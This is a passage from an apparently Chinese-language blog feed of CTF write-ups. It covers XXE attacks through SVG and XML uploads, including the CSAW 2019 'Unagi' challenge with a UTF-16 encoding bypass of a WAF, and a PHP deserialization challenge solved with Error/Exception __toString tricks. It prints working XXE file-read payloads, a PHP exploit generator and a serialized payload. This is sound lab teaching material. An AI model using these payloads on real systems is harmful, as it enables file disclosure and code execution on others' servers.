class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br></code></pre></td></tr></table></figure><p>读取的话<br>&#x2F;etc&#x2F;passwd文件 系统用户配置文件，存储了系统中所有用户的基本信息<br>&#x2F;proc&#x2F;self 链接到当前正在运行的进程<br>&#x2F;proc&#x2F;self&#x2F;cwd当前工作目录</p><p>这题可以读取&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>上传之后成功拿到flag。</p>]]></content>
      
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> svg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAWQual2019-Web_Unagi</title>
      <link href="/2025/04/21/CSAWQual2019-Web-Unagi/"/>
      <url>/2025/04/21/CSAWQual2019-Web-Unagi/</url>
      
        <content type="html"><![CDATA[<h1 id="CSAWQual2019-Web-Unagi"><a href="#CSAWQual2019-Web-Unagi" class="headerlink" title="CSAWQual2019-Web_Unagi"></a>CSAWQual2019-Web_Unagi</h1><p>在初始界面发现有个upload页面，点击之后发现很明显的文件上传。</p><p><img src="/../image/CSAWQual2019-Web_Unagi-1.png"></p><p>发现<code>You can check out the format example [here]</code>提示，点击here</p><p><img src="/../image/CSAWQual2019-Web_Unagi-2.png"></p><p>很明显提示我们这里要我们上传xml文档。</p><p>我们试试传入一个xml文档，看看是否会回显到页面</p><p>1.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> 123<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传发现存在回显。</p><p><img src="/../image/CSAWQual2019-Web_Unagi-3.png"></p><p>根据about中的提示Flag is located at &#x2F;flag, come get it，可以构造出外部实体xxe漏洞payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">users</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p>直接传发现没法传，很明显有waf</p><p>参考xxe的waf绕过：<a href="https://xz.aliyun.com/t/4059?time__1311=n4+xni0QG=oCuRgDlxGObCDOYa6dxAKDC8n0eD">https://xz.aliyun.com/t/4059?time__1311=n4%2Bxni0QG%3DoCuRgDlxGObCDOYa6dxAKDC8n0eD</a></p><p>这里我用的是utf-8转码为utf-16绕过</p><p>用linux</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iconv</span> -f utf8 -t utf-<span class="hljs-number">16</span> <span class="hljs-number">2</span>.xml&gt;<span class="hljs-number">1</span>.xml<br></code></pre></td></tr></table></figure><p>或者使用记事本打开，然后在右上角选择另存为，然后下方编码选择utf-16</p><p>得到flag</p><p><img src="/../image/CSAWQual2019-Web_Unagi-4.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> xxe </tag>
            
            <tag> upload </tag>
            
            <tag> xxe漏洞waf绕过 </tag>
            
            <tag> xxe编码绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战2020-Greatphp</title>
      <link href="/2025/04/21/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Greatphp/"/>
      <url>/2025/04/21/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020-Greatphp/</url>
      
        <content type="html"><![CDATA[<h1 id="极客大挑战2020-Greatphp"><a href="#极客大挑战2020-Greatphp" class="headerlink" title="极客大挑战2020-Greatphp"></a>极客大挑战2020-Greatphp</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">上半部分定义了一个 SYCLOVER 的类，存在 <span class="hljs-number">2</span> 个属性syc和lover，同时还定义了一个wake方法将这<span class="hljs-number">2</span>个属性进行强类型比较，和正则匹配，并且syc会传入<span class="hljs-built_in">eval</span>函数，下半部分就是传入一个great的参数，对这个参数进行反序列化，所以我们目标就明确了，我们需要绕过这个强类型比较，之后在绕过正则表达，最后执行寻找flag的命令.<br></code></pre></td></tr></table></figure><p>这里强类型比较可以用数组绕过，但是下面的eval函数不能传入数组。</p><p>这里通过PHP的原生类来进行绕过(Error 或者 Exception),这两个类中呢存在一个_toString()的方法属性,意思就是当这两个类的对面需要被转换成字符串的时候就会调用 _toString()</p><p><strong>在强类型比较是md5()以及sha1()会将对象转化为字符串从而调用_toString()</strong></p><p>原理：</p><p><a href="https://blog.csdn.net/alwtj/article/details/141788463">原文链接</a></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada">在 PHP 的 <span class="hljs-keyword">Exception</span> 类中，构造函数实际上可以接收三个参数，尽管在大多数情况下，只使用前两个参数就足够了。这三个参数分别是：<br><br>消息（message）：这是一个字符串，用于描述异常的具体原因或情况。它是构造函数的第一个参数，也是必须提供的参数。<br><br>代码（code）：这是一个整数，用于提供异常的特定代码。它是可选的，但在某些情况下，它可能有助于识别或分类异常。如果没有提供，它默认为 <span class="hljs-number">0</span>。<br><br>前一个异常（previous）：这是一个 <span class="hljs-keyword">Exception</span> 对象，用于表示当前异常之前发生的异常。这是可选的，但在处理异常的链式传递时非常有用。如果提供了这个参数，那么当前的异常就被视为前一个异常的“子异常”或“后继异常”。<br><br>而当该对象作为字符串输出是之后输出消息以及错误代码的行数  ( 重点 )<br></code></pre></td></tr></table></figure><p>具体实例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Exception</span><span class="hljs-punctuation">:</span> <span class="hljs-string">payload in E:\CTF\newphp\mixbp.php:2</span><br><span class="hljs-attribute">Stack trace</span><span class="hljs-punctuation">:</span><br><span class="hljs-comment">#0 &#123;main&#125;</span><br><br><span class="hljs-attribute">Exception</span><span class="hljs-punctuation">:</span> <span class="hljs-string">payload in E:\CTF\newphp\mixbp.php:2</span><br><span class="hljs-attribute">Stack trace</span><span class="hljs-punctuation">:</span><br><span class="hljs-comment">#0 &#123;main&#125;</span><br></code></pre></td></tr></table></figure><p>所以我们可以通过上面的特性来绕过强类型比较.</p><p>之后来构造payload来实现获取flag  注意:上面实现的payload我们可以自己控制</p><p>所以我们可以通过 include “&#x2F;flag” 命令来去把flag值显示在页面上,同时为了绕过正则表达的双引号我们可以通过取反来绕过,那么服务器拿到的效果就是:Exception: include “&#x2F;flag” in &#x2F;tmp&#x2F;sandbox.s0-s0;c501,c742&#x2F;home&#x2F;.code.tio:2 Stack trace:  ,有点乱很抽象所以我们需要闭合<code>&lt;?php 来实现我们包含flag文件的效果,又因为正则表达过滤了php我们可以用&lt;?php ?&gt; &lt;=&gt; &lt;?=?&gt;</code>来绕过.</p><p>所以构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;syc = <span class="hljs-variable">$b</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;lover = <span class="hljs-variable">$c</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$in</span> = ~(<span class="hljs-string">&quot;/flag&quot;</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="hljs-variable">$in</span>.<span class="hljs-string">&quot;?&gt;&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>)));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行结果</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">O<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>SYCLOVER<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>syc<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Error<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>message<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">20</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>Dinclude<span class="hljs-variable">%7</span>E<span class="hljs-variable">%D0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%98</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>Error<span class="hljs-variable">%00</span>string<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">1</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>file<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">23</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>E<span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>CCTF<span class="hljs-variable">%5</span>Cnewphp<span class="hljs-variable">%5</span>Cmixbp.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>line<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">12</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>Error<span class="hljs-variable">%00</span>trace<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Ba<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%7</span>Ds<span class="hljs-variable">%3</span>A<span class="hljs-number">15</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>Error<span class="hljs-variable">%00</span>previous<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>Ds<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>lover<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BO<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>Error<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>message<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">20</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%3</span>C<span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>Dinclude<span class="hljs-variable">%7</span>E<span class="hljs-variable">%D0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%98</span><span class="hljs-variable">%3</span>F<span class="hljs-variable">%3</span>E<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>Error<span class="hljs-variable">%00</span>string<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>code<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>file<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">23</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>E<span class="hljs-variable">%3</span>A<span class="hljs-variable">%5</span>CCTF<span class="hljs-variable">%5</span>Cnewphp<span class="hljs-variable">%5</span>Cmixbp.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">7</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%00</span>line<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">13</span><span class="hljs-variable">%3</span>Bs<span class="hljs-variable">%3</span>A<span class="hljs-number">12</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>Error<span class="hljs-variable">%00</span>trace<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Ba<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>B<span class="hljs-variable">%7</span>Ds<span class="hljs-variable">%3</span>A<span class="hljs-number">15</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%00</span>Error<span class="hljs-variable">%00</span>previous<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BN<span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<span class="hljs-variable">%7</span>D<br></code></pre></td></tr></table></figure><p>效果就成了 : <strong><code>Exception: ?&gt;&lt;?=include &quot;/flag&quot;?&gt; in /tmp/sandbox.s0-s0;c501,c742/home/.code.tio:2 Stack trace:</code></strong></p><p>解释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;/flag&quot;</span><span class="hljs-meta">?&gt;</span> 会被执行从而获取到flag的value了，而后面多余的报错会被当成文本内容输出，并且会多一个 “<span class="hljs-number">1</span>” ，这个 “<span class="hljs-number">1</span>” 是<span class="hljs-keyword">include</span>包含成功返回给<span class="hljs-keyword">echo</span>的.<br></code></pre></td></tr></table></figure><p>直接注入拿到flag</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">flag&#123;b3ce1836-<span class="hljs-number">928b-4277</span>-aa62-82e417d3d0aa&#125; <span class="hljs-number">1</span> <span class="hljs-keyword">in</span> E:\CTF\newphp\mixbp.php:<span class="hljs-number">13</span> Stack <span class="hljs-built_in">trace</span>: #<span class="hljs-number">0</span> &#123;main&#125;<br></code></pre></td></tr></table></figure><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><h3 id="php原生类-Error-Exception"><a href="#php原生类-Error-Exception" class="headerlink" title="php原生类 Error&#x2F;Exception"></a>php原生类 Error&#x2F;Exception</h3><p>原理：</p><p><a href="https://blog.csdn.net/alwtj/article/details/141788463">原文链接</a></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code 